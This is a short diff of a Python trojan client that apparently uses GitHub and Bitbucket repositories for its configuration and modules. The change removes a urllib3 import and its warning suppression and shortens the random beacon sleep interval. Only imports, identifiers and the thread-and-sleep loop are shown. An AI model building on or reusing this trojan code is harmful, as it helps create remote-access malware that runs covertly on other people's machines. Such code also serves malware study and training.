@@ -7,14 +7,12 @@ import random
 import threading
 import Queue
 import os
-import urllib3
 
 from bitbucket.bitbucket import Bitbucket
 from bitbucket.bitbucket import Repository
 from github3 import login
 
 trojan_id = "abc"
-urllib3.disable_warnings()
 trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
@@ -110,4 +108,4 @@ while True:
 			t.start()
 			time.sleep(random.randint(1,10))
 
-	time.sleep(random.randint(1000, 10000))
+	time.sleep(random.randint(100, 1000))
